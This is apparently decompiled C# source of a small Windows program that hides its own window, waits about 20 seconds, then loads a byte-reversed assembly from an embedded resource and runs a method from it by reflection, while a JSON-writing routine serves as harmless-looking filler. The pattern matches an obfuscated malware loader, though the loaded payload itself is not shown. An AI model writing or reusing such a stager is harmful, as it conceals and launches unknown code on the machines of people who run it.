using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using Newtonsoft.Json;
using Preevaaihmcbc.Properties;

namespace Preevaaihmcbc;

public static class Program
{
	[STAThread]
	public static void Main(string[] args)
	{
		Native.ShowWindow(Process.GetCurrentProcess().MainWindowHandle.ToInt32(), 0);
		WriteValue();
		Gigabyte();
		JsonSerializer();
	}

	private static void JsonSerializer()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Expected O, but got Unknown
		JsonWriter val = (JsonWriter)new JsonTextWriter((TextWriter)new StringWriter(new StringBuilder()));
		try
		{
			val.set_Formatting((Formatting)1);
			val.WriteStartObject();
			val.WritePropertyName("CPU");
			val.WriteValue("Intel");
			val.WritePropertyName("PSU");
			val.WriteValue("500W");
			val.WritePropertyName("Drives");
			val.WriteStartArray();
			val.WriteValue("DVD read/writer");
			val.WriteComment("(broken)");
			val.WriteValue("500 gigabyte hard drive");
			val.WriteValue("200 gigabyte hard drive");
			val.WriteEnd();
			val.WriteEndObject();
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	private static void Gigabyte()
	{
		Console.WriteLine((string)Assembly.Load(Resources.Tzezgcjcefqqbdssziojj.Reverse().ToArray()).GetType("SmartAssembly.Schemes.Listener")!.InvokeMember("InterruptParameter", BindingFlags.InvokeMethod, null, null, null));
	}

	private static void WriteValue()
	{
		for (int i = 0; i < 20; i++)
		{
			Thread.Sleep(999);
		}
	}
}
